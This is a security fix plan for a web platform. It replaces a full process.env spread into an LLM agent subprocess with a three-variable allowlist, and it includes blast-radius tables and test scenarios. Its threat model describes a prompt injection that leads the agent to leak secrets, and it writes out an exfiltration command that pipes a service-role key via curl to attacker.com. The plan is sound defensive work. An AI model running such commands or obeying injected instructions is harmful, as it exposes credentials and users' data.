---
title: "sec: replace process.env spread with minimal allowlist in agent subprocess"
type: fix
date: 2026-03-20
---

## Enhancement Summary

**Deepened on:** 2026-03-20
**Sections enhanced:** 5 (Blast Radius, Fix, SpecFlow Edge Cases, Test Scenarios, References)
**Research sources:** Agent SDK TypeScript API reference, Claude Code environment variables documentation, Node.js subprocess security best practices, GitHub issue #7099 (granular shell environment policy)

### Key Improvements
1. Confirmed via Agent SDK docs that `env` option defaults to `process.env` and explicit objects **replace** (not merge) the full environment -- validates the allowlist approach
2. Added `CLAUDE_CONFIG_DIR` consideration and rationale for exclusion
3. Strengthened test scenarios with a unit-testable `buildAgentEnv` extraction pattern

### New Considerations Discovered
- The Agent SDK TypeScript reference documents `env` as `Record<string, string | undefined>` with default `process.env` -- passing an explicit object fully replaces the inherited environment
- GitHub issue #7099 requests granular shell environment policies in Claude Code, confirming this is a known gap in the ecosystem
- No `NODE_ENV`, `LANG`, `TERM`, or other system vars are required by the Claude Code subprocess per the official env var reference

---

# sec: replace process.env spread with minimal allowlist in agent subprocess

The `startAgentSession` function in `apps/web-platform/server/agent-runner.ts` (line 158) spreads the entire server `process.env` into the Agent SDK subprocess:

```typescript
env: { ...process.env, ANTHROPIC_API_KEY: apiKey },
```

This passes every server-side secret to the LLM-driven subprocess, including `SUPABASE_SERVICE_ROLE_KEY`, `BYOK_ENCRYPTION_KEY`, `STRIPE_SECRET_KEY`, and `STRIPE_WEBHOOK_SECRET`. A prompt injection in any user message could instruct the agent to `echo $SUPABASE_SERVICE_ROLE_KEY` and exfiltrate credentials that grant full database access and the ability to decrypt every user's API keys.

## Blast Radius

Secrets currently leaked via `...process.env` (sourced from Docker `--env-file /mnt/data/.env`):

| Variable | Risk |
|----------|------|
| `SUPABASE_SERVICE_ROLE_KEY` | Full database read/write, bypasses RLS |
| `BYOK_ENCRYPTION_KEY` | Decrypt every user's stored API key |
| `STRIPE_SECRET_KEY` | Create charges, read customer data |
| `STRIPE_WEBHOOK_SECRET` | Forge webhook events |
| `NEXT_PUBLIC_SUPABASE_URL` | Low risk (public), but unnecessary |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Low risk (public), but unnecessary |
| `NODE_ENV`, `PORT` | Low risk, but unnecessary |

### Research Insights

**Attack vector specificity:** The Agent SDK subprocess has the Bash tool available (the code does not restrict `allowedTools`). A prompt injection payload like `echo $SUPABASE_SERVICE_ROLE_KEY | curl -X POST -d @- https://attacker.com` is trivially exploitable. The `canUseTool` callback on lines 160-214 sandboxes file operations to the workspace but does **not** restrict Bash commands, meaning shell access to env vars is unrestricted.

**Node.js subprocess isolation best practices (2025-2026):** The [Node.js security best practices guide](https://nodejs.org/en/learn/getting-started/security-best-practices) recommends that when running external code, applications should use dedicated processes with restricted environments. The [nodejs-security.com guidance](https://www.nodejs-security.com/blog/do-not-use-secrets-in-environment-variables-and-here-is-how-to-do-it-better) explicitly warns against relying on environment variables for secrets in production systems, recommending secrets managers instead -- but for this fix, restricting the subprocess env is the immediate mitigation.

## Fix

Replace line 158 in `apps/web-platform/server/agent-runner.ts`:

```typescript
// BEFORE (vulnerable)
env: { ...process.env, ANTHROPIC_API_KEY: apiKey },

// AFTER (allowlisted)
env: {
  ANTHROPIC_API_KEY: apiKey,
  HOME: process.env.HOME,
  PATH: process.env.PATH,
},
```

The agent subprocess needs exactly three variables:
- **`ANTHROPIC_API_KEY`**: The user's decrypted BYOK key (already passed explicitly).
- **`HOME`**: Required by Claude Code CLI for config resolution (`~/.claude/`). The `CLAUDE_CONFIG_DIR` env var can override this, but defaults to `$HOME/.claude` -- passing `HOME` is sufficient.
- **`PATH`**: Required to locate `claude` binary and git.

No other server secrets are needed by the subprocess.

### Research Insights

**Agent SDK `env` option behavior (confirmed via [TypeScript API reference](https://platform.claude.com/docs/en/agent-sdk/typescript)):** The `env` option has type `Record<string, string | undefined>` and defaults to `process.env`. When an explicit object is passed, it **replaces** the entire subprocess environment -- there is no merge with `process.env`. This means the three-variable allowlist will be the ONLY env vars available to the subprocess, which is the desired behavior.

**`CLAUDE_AGENT_SDK_CLIENT_APP`:** The SDK docs mention setting this in the `env` option to identify the calling app in the User-Agent header. This is optional telemetry -- not required for functionality. It can be added later if Anthropic analytics are needed.

**Variables explicitly NOT needed:**
| Variable | Reason for exclusion |
|----------|---------------------|
| `NODE_ENV` | Not referenced in [Claude Code env var docs](https://code.claude.com/docs/en/env-vars). The subprocess manages its own runtime. |
| `LANG` / `TERM` | Not required by the Claude CLI. The subprocess does not render terminal output. |
| `NODE_OPTIONS` | The Agent SDK manages its own Node.js process flags. |
| `SOLEUR_PLUGIN_PATH` | Already passed via the `plugins` option (line 159), not via env. |
| `CLAUDE_CONFIG_DIR` | Only needed if overriding the default `~/.claude` config location. `HOME` is sufficient. |
| `DISABLE_AUTOUPDATER` | Recommended for production, but the subprocess lifecycle is short-lived. Can be added later as an optimization. |
| `DISABLE_TELEMETRY` | Optional. Can be added later if subprocess telemetry is unwanted. |

## SpecFlow Edge Cases

1. **Missing `HOME` or `PATH`**: If `process.env.HOME` or `process.env.PATH` is undefined (unlikely in Docker but possible), the subprocess would fail to find the Claude CLI. The Dockerfile sets `USER soleur` which guarantees `HOME=/home/soleur`. `PATH` is inherited from the node base image. No guard needed -- if these are missing, the entire server is misconfigured.

2. **Future env requirements**: If a future Agent SDK version or plugin needs additional env vars (e.g., `LANG`, `TERM`, `NODE_ENV`), the subprocess will fail visibly (missing env error or broken behavior). This is the correct failure mode -- it forces an explicit allowlist update rather than silently leaking new secrets. GitHub issue [anthropics/claude-code#7099](https://github.com/anthropics/claude-code/issues/7099) tracks a feature request for granular shell environment policies in Claude Code itself, which may eventually provide a built-in solution.

3. **`NODE_OPTIONS`**: Not needed. The subprocess is spawned by the Agent SDK which manages its own Node.js process flags.

4. **`SOLEUR_PLUGIN_PATH`**: Not needed in the subprocess env. The `pluginPath` is already passed via the `plugins` option to the Agent SDK `query()` call (line 159).

5. **Bash tool not sandboxed**: The `canUseTool` callback restricts file operations (Read, Write, Edit, Glob, Grep) to the workspace directory, but does NOT restrict Bash commands. This means the subprocess can run arbitrary shell commands including `env`, `printenv`, and `echo $VAR`. The env allowlist is therefore the primary defense -- without it, any env var in the subprocess is exfiltrable. (Bash sandboxing is a separate hardening concern tracked independently.)

## Acceptance Criteria

- [ ] Line 158 of `apps/web-platform/server/agent-runner.ts` uses an explicit allowlist (`ANTHROPIC_API_KEY`, `HOME`, `PATH`) instead of `...process.env`
- [ ] No server secrets (`SUPABASE_SERVICE_ROLE_KEY`, `BYOK_ENCRYPTION_KEY`, `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`) appear in the subprocess environment
- [ ] Agent subprocess can still start successfully (Claude CLI resolves, git is on PATH)

## Test Scenarios

- Given the server has `SUPABASE_SERVICE_ROLE_KEY` in `process.env`, when `startAgentSession` spawns an agent subprocess, then the subprocess environment does NOT contain `SUPABASE_SERVICE_ROLE_KEY`
- Given the server has `BYOK_ENCRYPTION_KEY` in `process.env`, when `startAgentSession` spawns an agent subprocess, then the subprocess environment does NOT contain `BYOK_ENCRYPTION_KEY`
- Given the server has `HOME=/home/soleur` and a valid `PATH`, when `startAgentSession` spawns an agent subprocess, then the subprocess environment contains both `HOME` and `PATH` with the correct values
- Given the allowlist env object is passed to the Agent SDK, when the subprocess starts, then `Object.keys(env)` contains exactly `ANTHROPIC_API_KEY`, `HOME`, and `PATH` (no extra keys)

### Research Insights

**Recommended test pattern:** Extract the env construction into a pure function for unit testing without needing to mock the Agent SDK:

```typescript
// apps/web-platform/server/agent-runner.ts
export function buildAgentEnv(apiKey: string): Record<string, string | undefined> {
  return {
    ANTHROPIC_API_KEY: apiKey,
    HOME: process.env.HOME,
    PATH: process.env.PATH,
  };
}
```

This enables a unit test that sets known `process.env` values and asserts that only the allowlisted keys appear in the output -- no integration test or Agent SDK mock required. However, for a single-line P0 fix, this extraction is optional and can be done in a follow-up. The inline fix is sufficient and correct.

## MVP

### apps/web-platform/server/agent-runner.ts (line 158)

```typescript
env: {
  ANTHROPIC_API_KEY: apiKey,
  HOME: process.env.HOME,
  PATH: process.env.PATH,
},
```

## References

- Closes #723
- Related: PR #721 (code review where this was discovered)
- File: `apps/web-platform/server/agent-runner.ts:158`
- [Agent SDK TypeScript API Reference -- Options.env](https://platform.claude.com/docs/en/agent-sdk/typescript)
- [Claude Code Environment Variables](https://code.claude.com/docs/en/env-vars)
- [Node.js Security Best Practices](https://nodejs.org/en/learn/getting-started/security-best-practices)
- [GitHub: Granular Shell Environment Policy request](https://github.com/anthropics/claude-code/issues/7099)
